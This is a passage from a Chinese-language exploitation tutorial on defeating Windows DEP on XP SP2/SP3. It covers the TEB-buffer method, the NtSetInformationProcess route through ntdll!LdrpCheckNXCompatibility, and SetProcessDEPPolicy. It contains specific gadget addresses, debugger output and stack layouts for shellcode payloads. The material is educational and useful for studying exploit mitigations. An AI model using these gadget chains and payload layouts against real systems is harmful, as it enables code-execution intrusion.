&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;#1002CA33  -FF25 E8F30310    JMP DWORD PTR DS:[1003F3E8]  [Module : guard32.dll]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# jmp to here&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#6FFF04C0   8BFF             MOV EDI,EDI&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#6FFF04C2   55               PUSH EBP&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#6FFF04C3   8BEC             MOV EBP,ESP&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#6FFF04C5  -E9 E64BFF06      JMP kernel32.76FE50B0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# jmp to here&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#76FE50B0   5D               POP EBP&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#76FE50B1  ^E9 02D0FBFF      JMP &amp;lt;JMP.&amp;amp;API-MS-Win-Core-Memory-L1-1-0.VirtualProtect&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# jmp to here&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#76FA20B8  -FF25 1019FA76    JMP DWORD PTR DS:[&amp;lt;&amp;amp;API-MS-Win-Core-Memory-L1-1-0.VirtualProtect&amp;gt;; KERNELBA.VirtualProtect&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;关于ret2lib技术的更多信息可参考资料：&lt;a href=&quot;http://www.infosecwriters.com/text_resources/pdf/return-to-libc.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.infosecwriters.com/text_resources/pdf/return-to-libc.pdf&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;2-利用TEB突破DEP&quot;&gt;&lt;a href=&quot;#2-利用TEB突破DEP&quot; class=&quot;headerlink&quot; title=&quot;2.利用TEB突破DEP&quot;&gt;&lt;/a&gt;2.利用TEB突破DEP&lt;/h4&gt;&lt;p&gt;在之前的《黑客防线》中有篇文章《SP2下利用TEB执行ShellCode》，有兴趣的读者可以翻看黑防出版的《缓冲区溢出攻击与防范专辑》，上面有这篇文章。该作者在文中提到一种利用TEB（线程环境块）来突破DEP的方法，不过它受系统版本限制，只能在XP sp2及其以下版本的windows系统上使用，因为更高版本的系统，其TEB地址是不固定的，每次都是动态生成的。该方法的具体实现方法如下：&lt;br&gt;（1）将返回地址覆盖成字符串复制函数的地址，比如lstrcpy，memcpy等等；&lt;br&gt;（2）在返回地址之后用目标内存地址和shellcode地址覆盖，当执行复制操作时，就会将shellcode复制到目标内存地址，该目标内存地址位于TEB偏移0xC00的地方，它有520字节缓存用于ANSI-to-Unicode函数的转换；&lt;br&gt;（3）复制操作结束后返回到shellcode地址并执行它。&lt;br&gt;此时其堆栈布局如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;┏━━━━━━━┓&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【shellcode 】&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【save ebp  】&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【lstrcpy 】&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【TEB缓存地址 】&amp;lt;= 用于复制结束后返回到shellcode&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【TEB缓存地址 】&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【ShellCode地址 】&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┗━━━━━━━┛&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;3-利用NtSetInformationProcess关闭DEP&quot;&gt;&lt;a href=&quot;#3-利用NtSetInformationProcess关闭DEP&quot; class=&quot;headerlink&quot; title=&quot;3.利用NtSetInformationProcess关闭DEP&quot;&gt;&lt;/a&gt;3.利用NtSetInformationProcess关闭DEP&lt;/h4&gt;&lt;p&gt;关于此方法最原始的资料应该是黑客杂志《uninformed》上的文章&lt;a href=&quot;http://www.uninformed.org/?v=2&amp;amp;a=4&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《Bypassing Windows Hardware-enforced Data Execution Prevention》&lt;/a&gt;，另外也可以看下本人之前翻译的&lt;a href=&quot;http://bbs.pediy.com/showthread.php?t=99045&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《突破win2003 sp2中基于硬件的DEP》&lt;/a&gt;，此方法的主要原理就是利用NtSetInformationProcess()函数来设置KPROCESS 结构中的相关标志位，进而关闭DEP，KPROCESS结构中相关标志位情况如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;000&lt;/span&gt;&amp;gt; dt nt!_KPROCESS -r&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ntdll!_KPROCESS&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;. . .&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+&lt;span class=&quot;number&quot;&gt;0x06b&lt;/span&gt; Flags      : _KEXECUTE_OPTIONS&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        +&lt;span class=&quot;number&quot;&gt;0x000&lt;/span&gt; ExecuteDisable     : Pos &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; Bit&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        +&lt;span class=&quot;number&quot;&gt;0x000&lt;/span&gt; ExecuteEnable    : Pos &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; Bit&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        +&lt;span class=&quot;number&quot;&gt;0x000&lt;/span&gt; DisableThunkEmulation  : Pos &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; Bit&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        +&lt;span class=&quot;number&quot;&gt;0x000&lt;/span&gt; Permanent    : Pos &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; Bit&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        +&lt;span class=&quot;number&quot;&gt;0x000&lt;/span&gt; ExecuteDispatchEnable  : Pos &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; Bit&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        +&lt;span class=&quot;number&quot;&gt;0x000&lt;/span&gt; ImageDispatchEnable  : Pos &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; Bit&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        +&lt;span class=&quot;number&quot;&gt;0x000&lt;/span&gt; Spare      : Pos &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; Bits&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当DEP 被启用时，ExecuteDisable 被置位，当DEP 被禁用，ExecuteEnable 被置位，当Permanent 标志置位时表示这些设置是最终设置，不可更改。代码实现：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;NtSetInformationProcess(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        NtCurrentProcess(),   &lt;span class=&quot;comment&quot;&gt;// ProcessHandle = -1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ProcessExecuteFlags,  &lt;span class=&quot;comment&quot;&gt;// ProcessInformationClass = 0x22（ProcessExecuteFlags）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;amp;ExecuteFlags,    &lt;span class=&quot;comment&quot;&gt;// ProcessInformation = 0x2（MEM_EXECUTE_OPTION_ENABLE）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(ExecuteFlags));  &lt;span class=&quot;comment&quot;&gt;// ProcessInformationLength = 0x4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;具体实现思路（以我电脑上VirtualBox虚拟机下的xp sp3为例）：&lt;br&gt;1) 将al设置为1，比如指令mov al,1 / ret，然后用该指令地址覆盖返回地址：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0:000&amp;gt; lmm ntdll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;start    end        module name&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c920000 7c9b3000   ntdll      (pdb symbols)          c:\symbollocal\ntdll.pdb\1751003260CA42598C0FB326585000ED2\ntdll.pdb&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0:000&amp;gt; s 7c920000 l 93000 b0 01 c2 04&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c9718ea  b0 01 c2 04 00 90 90 90-90 90 8b ff 55 8b ec 56  ............U..V&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0:000&amp;gt; u 7c9718ea&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ntdll!NtdllOkayToLockRoutine:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c9718ea b001            mov     al,1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c9718ec c20400          ret     4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由于上面的ret 4，因此要再向栈中填充4字节（比如0xffffffff）以抵消多弹出的4字节，如果选择的指令刚好是ret则无须再多填充4字节。&lt;/p&gt;
&lt;p&gt;2) 跳转到ntdll!LdrpCheckNXCompatibility中的部分代码（从cmp al,1 开始，可通过windbg下的命令uf ntdll!LdrpCheckNXCompatibility来查看其反汇编代码），比如以下地址就需要用0x7c93cd24来覆写堆栈上的第二个地址：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ntdll!LdrpCheckNXCompatibility+0x13:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c93cd24 3c01            cmp     al,1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c93cd26 6a02            push    2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c93cd28 5e              pop     esi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c93cd29 0f84df290200    je      ntdll!LdrpCheckNXCompatibility+0x1a (7c95f70e)  ; 之前已将al置1，故此处实现跳转&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;3) 上面跳转后来到这里：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0:000&amp;gt; u 7c95f70e&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ntdll!LdrpCheckNXCompatibility+0x1a:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c95f70e 8975fc          mov     dword ptr [ebp-4],esi  ; [ebp-0x4]= esi = 2     &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;;执行到这里的时候会发现ebp-4(41414141-4 = 4141413d)而导致不可写，因此我们需要在前面调整下ebp的值，比如可以使用以下指令：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;;- push esp / pop ebp / ret&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;;- mov esp,ebp / ret&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;;或者其它可调整ebp为可写地址的指令&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c95f711 e919d6fdff      jmp     ntdll!LdrpCheckNXCompatibility+0x1d (7c93cd2f)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;4) 上面跳转后来到：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0:000&amp;gt; u 7c93cd2f&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ntdll!LdrpCheckNXCompatibility+0x1d:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c93cd2f 837dfc00        cmp     dword ptr [ebp-4],0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c93cd33 0f85f89a0100    jne     ntdll!LdrpCheckNXCompatibility+0x4d (7c956831) ; 由于不相等再次实现跳转&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;5) 上面跳转后来到：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0:000&amp;gt; u 7c956831&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ntdll!LdrpCheckNXCompatibility+0x4d:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c956831 6a04            push    4    ;ProcessInformationLength = 4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c956833 8d45fc          lea     eax,[ebp-4]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c956836 50              push    eax      ;ProcessInformation = 2（MEM_EXECUTE_OPTION_ENABLE）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c956837 6a22            push    22h      ;ProcessInformationClass = 0x22（ProcessExecuteFlags）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c956839 6aff            push    0FFFFFFFFh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c95683b e84074fdff      call    ntdll!ZwSetInformationProcess (7c92dc80)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c956840 e92865feff      jmp     ntdll!LdrpCheckNXCompatibility+0x5c (7c93cd6d)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c956845 90              nop&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在这里调用函数ZwSetInformationProcess（），而其参数也刚好达到我们关闭DEP的各项要求.&lt;/p&gt;
&lt;p&gt;6) 最后跳转到函数结尾：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0:000&amp;gt; u 7c93cd6d&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ntdll!LdrpCheckNXCompatibility+0x5c:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c93cd6d 5e              pop     esi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c93cd6e c9              leave&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c93cd6f c20400          ret     4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最后的堆栈布局应为：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;┏━━━━━━━━━━━━━━━━┓&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【  AAA……       】  &amp;lt;= 填充数据&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【  push esp/pop ebp/ret    】  &amp;lt;= 调整ebp为可写地址&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【  al=1地址      】  &amp;lt;= 返回地址&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【  0xffffffff      】  &amp;lt;= 平衡堆栈 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【LdrpCheckNXCompatibility指令地址】  &amp;lt;= 指令cmp al,0x1 的起始地址&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【  0xffffffff      】  &amp;lt;= 平衡堆栈 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【  &amp;quot;A&amp;quot; x 54      】  &amp;lt;= 调整NX禁用后的堆栈&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【  call/jmp esp      】&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【  shellcode     】    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┗━━━━━━━━━━━━━━━━┛&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果在禁用NX后，又需要读取esi或ebp，但此时它们又被我们填充的数据覆盖掉了，那么我们可以使用诸如push esp/pop esi/ret或者push esp/pop ebp/ret这样的指令来调整esi和ebp，以使关闭DEP后还能够正常执行。&lt;br&gt;辅助工具：ImmDbg pycommand插件（!pvefindaddr depxpsp3  + !findantidep）&lt;/p&gt;
&lt;h4 id=&quot;4-利用SetProcessDEPPolicy来关闭DEP&quot;&gt;&lt;a href=&quot;#4-利用SetProcessDEPPolicy来关闭DEP&quot; class=&quot;headerlink&quot; title=&quot;4.利用SetProcessDEPPolicy来关闭DEP&quot;&gt;&lt;/a&gt;4.利用SetProcessDEPPolicy来关闭DEP&lt;/h4&gt;&lt;p&gt;适用在：Windows XP SP3，Vista SP1 和Windows 2008。&lt;br&gt;为了能使这个函数有效，当前的DEP 策略必须设成OptIn 或者OptOut。如果策略被设成&lt;br&gt;AlwaysOn（或者AlwaysOff），然后SetProcessDEPPolicy 将会抛出一个错误。如果一个模块&lt;br&gt;是以/NXCOMPAT 链接的，这个技术也将不会成功。最后，同等重要的是，它这能被进程调&lt;br&gt;用一次。因此如果这个函数已经被当前进程调用（如IE8，当程序开始时已经调用它），它&lt;br&gt;将不成功。&lt;br&gt;Bernardo Damele 写了一篇关于这一技术的博文&lt;a href=&quot;http://bernardodamele.blogspot.com/2009/12/dep-bypass-with-setprocessdeppolicy.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《DEP bypass with SetProcessDEPPolicy()》&lt;/a&gt;&lt;br&gt;函数原型如下：&lt;/p&gt;
